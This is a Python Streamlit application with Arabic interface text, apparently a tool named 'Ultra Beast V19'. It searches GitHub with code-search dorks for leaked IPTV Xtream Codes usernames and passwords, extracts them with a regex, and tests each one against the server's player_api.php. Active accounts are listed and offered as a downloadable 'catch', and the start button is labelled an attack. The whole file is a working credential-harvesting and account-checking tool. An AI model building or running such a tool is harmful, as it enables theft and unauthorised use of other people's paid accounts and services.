import streamlit as st
import requests
import re
import time
from datetime import datetime

# =================================================
# 1. نظام الأمان والهوية
# =================================================
LOGIN_PASSWORD = "BEAST_V17_PRO" 

if "auth" not in st.session_state:
    st.session_state.auth = False

def login_screen():
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ ULTRA BEAST V19 PRO</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color:#888;'>النسخة المليونية - تحديث الرادار الفوري</p>", unsafe_allow_html=True)
    pwd = st.text_input("كلمة المرور:", type="password")
    if st.button("تنشيط المحرك"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.auth = True
            st.rerun()
        else: st.error("❌ الوصول مرفوض")

if not st.session_state.auth:
    login_screen()
    st.stop()

# =================================================
# 2. إعدادات الواجهة المتقدمة
# =================================================
st.set_page_config(page_title="Ultra Beast V19 - Live", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #05070a; }
    .beast-card {
        background: linear-gradient(145deg, #0d1117, #161b22);
        border: 1px solid #30363d;
        border-left: 6px solid #00ff41;
        padding: 20px;
        border-radius: 12px;
        margin-bottom: 15px;
        box-shadow: 0 4px 15px rgba(0,255,65,0.1);
    }
    .status-tag { color: #00ff41; font-weight: bold; font-family: 'Courier New'; font-size: 16px; }
    .data-label { color: #fbbf24; font-weight: bold; }
    .data-value { color: #e6edf3; font-family: monospace; }
    .terminal-text { color: #58a6ff; font-family: 'Consolas', monospace; font-size: 13px; }
</style>
""", unsafe_allow_html=True)

# إدارة البيانات
if 'all_hits' not in st.session_state: st.session_state.all_hits = []
if 'is_running' not in st.session_state: st.session_state.is_running = False
if 'counter' not in st.session_state: st.session_state.counter = {"checked": 0, "found": 0}
if 'cache' not in st.session_state: st.session_state.cache = set()

# =================================================
# 3. محرك الفحص الذكي
# =================================================
def check_server(host, user, pw):
    uid = f"{host}{user}"
    if uid in st.session_state.cache: return None
    st.session_state.cache.add(uid)

    try:
        # فحص مباشر وسريع
        target = f"{host}/player_api.php?username={user}&password={pw}"
        resp = requests.get(target, timeout=5).json()
        
        if resp.get("user_info", {}).get("status") == "Active":
            info = resp["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            return {
                "host": host, "user": user, "pass": pw, "exp": exp,
                "max": info.get('max_connections', '1'),
                "active": info.get('active_cons', '0')
            }
    except: return None
    return None

# =================================================
# 4. لوحة التحكم والبحث المليوني
# =================================================
with st.sidebar:
    st.title("🛡️ Beast V19")
    token = st.text_input("GitHub Token:", type="password", placeholder="ghp_xxxx...")
    
    col_a, col_b = st.columns(2)
    with col_a:
        if st.button("🚀 بدء الهجوم"):
            if token: 
                st.session_state.is_running = True
                st.rerun()
    with col_b:
        if st.button("🛑 إيقاف"):
            st.session_state.is_running = False
            st.rerun()

    st.divider()
    st.metric("💎 شغال", st.session_state.counter["found"])
    st.metric("🔍 مفحوص", st.session_state.counter["checked"])
    
    if st.session_state.all_hits:
        txt_res = ""
        for h in st.session_state.all_hits:
            txt_res += f"HOST: {h['host']}\nUSER: {h['user']} | PASS: {h['pass']}\nEXP: {h['exp']}\n{'-'*40}\n"
        st.download_button("📥 تحميل الصيد", txt_res, "Beast_V19_Hits.txt")

# =================================================
# 5. منطقة العرض المباشر (الرادار)
# =================================================
st.subheader("📡 رادار الصيد المباشر (تحديث فوري)")
log_box = st.empty()
results_area = st.container()

# عرض النتائج فوراً
with results_area:
    for hit in st.session_state.all_hits:
        st.markdown(f"""
        <div class="beast-card">
            <div class="status-tag">✅ SERVER ACTIVE</div>
            <div style="margin-top:10px;">
                <span class="data-label">Host:</span> <span class="data-value">{hit['host']}</span><br>
                <span class="data-label">User:</span> <span class="data-value">{hit['user']}</span> | 
                <span class="data-label">Pass:</span> <span class="data-value">{hit['pass']}</span><br>
                <span class="data-label">Expiry:</span> <span style="color:#ff7b72;">{hit['exp']}</span> | 
                <span class="data-label">Connections:</span> <span class="data-value">{hit['active']}/{hit['max']}</span>
            </div>
        </div>
        """, unsafe_allow_html=True)

# تشغيل عملية البحث المليونية
if st.session_state.is_running:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # قائمة دروكات ضخمة جداً
    massive_dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'filename:xtream_codes.txt',
        'iptv xtream 2026',
        '"http://" "user" "pass" "port" extension:txt',
        'filename:iptv.txt "http"',
        'extension:php "username" "password" "xtream"',
        'filename:passwords.txt "http" "port"'
    ]

    while st.session_state.is_running:
        for dork in massive_dorks:
            if not st.session_state.is_running: break
            
            for page in range(1, 20): # البحث في 20 صفحة لكل دورك (آلاف النتائج)
                if not st.session_state.is_running: break
                
                log_box.markdown(f"<p class='terminal-text'>🔍 جاري مسح الصفحات: {dork} | صفحة {page}</p>", unsafe_allow_html=True)
                
                try:
                    url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    api_res = requests.get(url, headers=headers).json()
                    
                    if "items" not in api_res:
                        log_box.warning("⏳ جيت هاب يطلب استراحة (Rate Limit).. سأنتظر 20 ثانية.")
                        time.sleep(20)
                        continue

                    for item in api_res['items']:
                        if not st.session_state.is_running: break
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        
                        try:
                            content = requests.get(raw_url, timeout=3).text
                            # Regex مرن جداً لالتقاط كل الأشكال
                            pattern = r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)"
                            matches = re.findall(pattern, content)
                            
                            for m in matches:
                                st.session_state.counter["checked"] += 1
                                log_box.markdown(f"<p class='terminal-text'>⚡ فحص: {m[0]}</p>", unsafe_allow_html=True)
                                
                                result = check_server(m[0], m[1], m[2])
                                if result:
                                    st.session_state.all_hits.insert(0, result)
                                    st.session_state.counter["found"] += 1
                                    st.rerun() # تحديث الواجهة فوراً عند كل صيد
                        except: continue
                except: continue
                time.sleep(1)
